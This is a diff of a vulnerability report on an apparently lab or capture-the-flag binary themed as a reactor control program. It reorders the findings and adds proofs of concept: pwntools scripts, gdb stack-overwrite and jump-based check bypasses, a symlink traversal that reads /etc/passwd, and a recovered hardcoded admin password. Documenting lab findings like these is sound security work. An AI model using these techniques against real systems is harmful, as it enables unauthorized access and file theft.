@@ -43,7 +43,97 @@ Unauthorized access to admin/emergency controls (high-confidence)
 Potential full operational takeover of critical reactor functions if this command is reachable in production context (critical business/operational risk)
 
 
-### Vulnerability #2: alchemy
+
+
+### Vulnerability #2: load_fuel_rods
+
+
+Severity: Critical
+Type: Buffer Overflow / Underflow
+Location: load_fuel_rods command path
+Discovered in: Black-box
+
+Description:
+The PoC repeatedly triggers behavior consistent with a memory corruption primitive labeled as buffer overflow.
+The command accepts attacker-controlled input and reaches abnormal output path, indicating likely stack overwrite potential.
+
+Proof of Concept:
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def main():
+    warnings.filterwarnings("ignore", category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    output = b''
+
+    for _ in range(3):
+        pid = process(['./runner/run.sh'], env=env)
+        pid.recvuntil(b'\x00', timeout=1.0)
+        pid.sendline(b'load_fuel_rods')
+        pid.sendline(b'10')
+
+        output = pid.recvrepeat(timeout=1.2)
+        pid.close()
+
+    print(text.red("[+]") + " Vuln Buffer Overflow - load_fuel_rods:")
+    print(output.splitlines()[3][12:-2])
+    print()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Impact:
+Potential code execution or control-flow corruption
+Process crash / denial of service
+High exploitability in native binary context
+
+
+
+
+### Vulnerability #3: monitor_radiation_levels
+
+
+Severity: Critical
+Type: Memory corruption
+Location: monitor_radiation_levels runtime stack frame
+Discovered in: Black-box
+
+Description:
+The exploit overwrites a stack slot with a function address and diverts execution.
+This behavior is consistent with memory safety weakness enabling direct control-flow manipulation.
+
+Proof of Concept:
+```gdb
+break *0x004027e8
+break *0x4027fc
+run
+monitor_radiation_levels
+continue
+set *(long long*)($rbp-0x8)=0x004024a0
+continue
+0
+# Succefull done exploit
+```
+
+Impact:
+Arbitrary control-flow redirection
+Potential code execution in process context
+Severe integrity compromise
+
+
+
+
+### Vulnerability #4: alchemy
 
 
 Severity: High
@@ -88,7 +178,9 @@ Secret recovery by reverse engineering
 Potential reuse of recovered secret in other modules
 
 
-### Vulnerability #3: check_cooling_pressure
+
+
+### Vulnerability #5: check_cooling_pressure
 
 
 Severity: High
@@ -135,7 +227,9 @@ Unauthorized disclosure of sensitive operational information
 Facilitates chained attacks with other privileged functions
 
 
-### Vulnerability #4: run_diagnostic
+
+
+### Vulnerability #6: run_diagnostic
 
 
 Severity: High
@@ -183,7 +277,127 @@ Privilege escalation through undocumented debug path
 Information disclosure from restricted diagnostics
 
 
-### Vulnerability #5: check_reactor_status
+
+
+### Vulnerability #7: read_turbine_config
+
+
+Severity: High
+Type: Directory traversal
+Location: external_lib/read_turbine_config/decompiler/main.c, function main
+Discovered in: Black-box
+
+Description:
+Input sanitization only blocks ".." but trusts files under Data/.
+An attacker can create a symlink in Data/ pointing to arbitrary filesystem targets (e.g., /etc/passwd), bypassing intended directory restrictions.
+
+Proof of Concept:
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+warnings.filterwarnings("ignore", category=BytesWarning)
+context.log_level = 'error'
+
+env = os.environ.copy()
+env['LD_LIBRARY_PATH'] = './runner/external/'
+
+os.system("mkdir -p Data; cd Data")
+os.system("ln -s /etc/passwd Data/passwd; cd ..")
+
+pid = process(['./runner/run.sh'], env=env)
+pid.recv(numb=100, timeout=1.0)
+pid.sendline(b'read_turbine_config')
+
+pid.recv(timeout=1.0)
+pid.sendline(b'passwd')
+
+print(text.red("[+]") + " Vuln directory traversal - read_turbine_config:")
+os.system("cat Data/passwd")
+print()
+os.system("rm -rf Data")
+```
+
+Impact:
+Arbitrary file read (subject to process privileges)
+Disclosure of host and credential-related data
+
+
+
+
+### Vulnerability #8: emergency_shutdown
+
+
+Severity: High
+Type: Bypass
+Location: emergency_shutdown runtime control flow
+Discovered in: Black-box
+
+Description:
+By using instruction pointer jumps and register manipulation, the PoC forces a success state without legitimate flow completion.
+This reveals fragile runtime trust assumptions under tampering.
+
+Proof of Concept:
+```gdb
+break *0x004024a0
+break *0x004034ba
+run
+init_reactor
+jump *0x004034a8
+break *0x4034b7
+jump *0x4034b7
+set $eax=1
+break *0x4189d0
+continue
+continue
+```
+
+Impact:
+Forced privileged shutdown flow
+Bypass of expected safety checks in debug-capable context
+
+
+
+
+### Vulnerability #9: embedded_secret_strings
+
+
+Severity: High
+Type: Information Disclosure
+Location: binary string table (runner/obsidian)
+Discovered in: Static analysis (Cutter + strings)
+
+Description:
+Static string extraction reveals sensitive and operationally meaningful messages directly embedded in the binary.
+Among the extracted entries, the following string indicates hidden secret logic and recoverable internal data without runtime exploitation:
+`{The stone isn't in the pocket anymore ...}`
+
+Additional extracted strings suggest hardcoded sensitive states and privileged flows exposed at rest (for example admin- and secret-related messages).
+This means an attacker can recover sensitive context using only offline analysis of the executable.
+
+Proof of Concept:
+```bash
+strings ./runner/obsidian | grep "{"
+
+# Extracted examples:
+{The secret stone is here !}
+{The stone isn't in the pocket anymore ...}
+{ADMIN4242}
+{Correct password! Welcome, admin.}
+{SHUTDOWN}
+```
+
+Impact:
+Disclosure of sensitive internal information from the binary itself
+Facilitates reverse engineering of privileged flows and attack chaining
+
+
+
+
+### Vulnerability #10: check_reactor_status
 
 
 Severity: Medium
@@ -240,7 +454,9 @@ Loss of confidentiality of supposedly protected status data
 Attackers can decode messages without key material
 
 
-### Vulnerability #6: send_status_report
+
+
+### Vulnerability #11: send_status_report
 
 
 Severity: Medium
@@ -290,7 +506,9 @@ Sensitive status report disclosure
 False sense of security for transmitted or stored data
 
 
-### Vulnerability #7: init_steam_turbine
+
+
+### Vulnerability #12: init_steam_turbine
 
 
 Severity: Medium
@@ -336,7 +554,9 @@ Predictable random-dependent behavior
 Potential bypass of logic that assumes randomness
 
 
-### Vulnerability #8: simulate_meltdown
+
+
+### Vulnerability #13: simulate_meltdown
 
 
 Severity: Medium
@@ -386,54 +606,9 @@ Unauthorized triggering of critical error states
 Increased operational risk from probabilistic abuse
 
 
-### Vulnerability #9: read_turbine_config
 
 
-Severity: High
-Type: Directory traversal
-Location: external_lib/read_turbine_config/decompiler/main.c, function main
-Discovered in: Black-box
-
-Description:
-Input sanitization only blocks ".." but trusts files under Data/.
-An attacker can create a symlink in Data/ pointing to arbitrary filesystem targets (e.g., /etc/passwd), bypassing intended directory restrictions.
-
-Proof of Concept:
-```python
-#!/usr/bin/python3
-
-from pwn import *
-import os
-import warnings
-
-warnings.filterwarnings("ignore", category=BytesWarning)
-context.log_level = 'error'
-
-env = os.environ.copy()
-env['LD_LIBRARY_PATH'] = './runner/external/'
-
-os.system("mkdir -p Data; cd Data")
-os.system("ln -s /etc/passwd Data/passwd; cd ..")
-
-pid = process(['./runner/run.sh'], env=env)
-pid.recv(numb=100, timeout=1.0)
-pid.sendline(b'read_turbine_config')
-
-pid.recv(timeout=1.0)
-pid.sendline(b'passwd')
-
-print(text.red("[+]") + " Vuln directory traversal - read_turbine_config:")
-os.system("cat Data/passwd")
-print()
-os.system("rm -rf Data")
-```
-
-Impact:
-Arbitrary file read (subject to process privileges)
-Disclosure of host and credential-related data
-
-
-### Vulnerability #10: run_turbine
+### Vulnerability #14: run_turbine
 
 
 Severity: Medium
@@ -480,7 +655,9 @@ Logic bypass of input constraints
 Unexpected runtime behavior and potential stability issues
 
 
-### Vulnerability #11: turbine_explode
+
+
+### Vulnerability #15: turbine_explode
 
 
 Severity: Medium
@@ -524,7 +701,9 @@ Forced critical failure path
 Potential denial of service and unsafe state transitions
 
 
-### Vulnerability #12: set_reactor_power
+
+
+### Vulnerability #16: set_reactor_power
 
 
 Severity: Medium
@@ -553,91 +732,9 @@ Bypass of expected validation constraints
 Unauthorized state transitions when debugger access exists
 
 
-### Vulnerability #13: load_fuel_rods
 
 
-Severity: Critical
-Type: Buffer Overflow / Underflow
-Location: load_fuel_rods command path
-Discovered in: Black-box
-
-Description:
-The PoC repeatedly triggers behavior consistent with a memory corruption primitive labeled as buffer overflow.
-The command accepts attacker-controlled input and reaches abnormal output path, indicating likely stack overwrite potential.
-
-Proof of Concept:
-```python
-#!/usr/bin/python3
-
-from pwn import *
-import os
-import warnings
-
-def main():
-    warnings.filterwarnings("ignore", category=BytesWarning)
-    context.log_level = 'error'
-
-    env = os.environ.copy()
-    env['LD_LIBRARY_PATH'] = './runner/external/'
-
-    output = b''
-
-    for _ in range(3):
-        pid = process(['./runner/run.sh'], env=env)
-        pid.recvuntil(b'\x00', timeout=1.0)
-        pid.sendline(b'load_fuel_rods')
-        pid.sendline(b'10')
-
-        output = pid.recvrepeat(timeout=1.2)
-        pid.close()
-
-    print(text.red("[+]") + " Vuln Buffer Overflow - load_fuel_rods:")
-    print(output.splitlines()[3][12:-2])
-    print()
-
-
-if __name__ == "__main__":
-    main()
-```
-
-Impact:
-Potential code execution or control-flow corruption
-Process crash / denial of service
-High exploitability in native binary context
-
-
-### Vulnerability #14: monitor_radiation_levels
-
-
-Severity: Critical
-Type: Memory corruption
-Location: monitor_radiation_levels runtime stack frame
-Discovered in: Black-box
-
-Description:
-The exploit overwrites a stack slot with a function address and diverts execution.
-This behavior is consistent with memory safety weakness enabling direct control-flow manipulation.
-
-Proof of Concept:
-```gdb
-break *0x004027e8
-break *0x4027fc
-run
-monitor_radiation_levels
-continue
-set *(long long*)($rbp-0x8)=0x004024a0
-continue
-0
-# Succefull done exploit
-```
-
-Impact:
-Arbitrary control-flow redirection
-Potential code execution in process context
-Severe integrity compromise
-
-
-### Vulnerability #15: turbine_remote_access
+### Vulnerability #17: turbine_remote_access
 
 
 Severity: Medium
@@ -681,39 +778,9 @@ Disclosure of sensitive access tokens/flags
 Race-window based data leakage
 
 
-### Vulnerability #16: emergency_shutdown
 
 
-Severity: High
-Type: Bypass
-Location: emergency_shutdown runtime control flow
-Discovered in: Black-box
-
-Description:
-By using instruction pointer jumps and register manipulation, the PoC forces a success state without legitimate flow completion.
-This reveals fragile runtime trust assumptions under tampering.
-
-Proof of Concept:
-```gdb
-break *0x004024a0
-break *0x004034ba
-run
-init_reactor
-jump *0x004034a8
-break *0x4034b7
-jump *0x4034b7
-set $eax=1
-break *0x4189d0
-continue
-continue
-```
-
-Impact:
-Forced privileged shutdown flow
-Bypass of expected safety checks in debug-capable context
-
-
-### Vulnerability #17: quit
+### Vulnerability #18: quit
 
 
 Severity: Medium
@@ -737,7 +804,9 @@ Bypass of intended quit/control checks
 Potential abuse of hidden branches in debug context
 
 
-### Vulnerability #18: log_system_event
+
+
+### Vulnerability #19: log_system_event
 
 
 Severity: Medium
@@ -766,7 +835,9 @@ Impact:
 Unauthorized access to protected log resources
 Integrity loss of runtime decision state
 
-### Vulnerability #19: call_api
+
+
+### Vulnerability #20: call_api
 
 
 Severity: Medium
@@ -789,6 +860,8 @@ for (let i = 0; i < 20; i++) {
 Impact:
 Exposure of embedded secret values
 Loss of confidentiality for client-distributed logic/data
+
+
 
 
 ## Conclusion
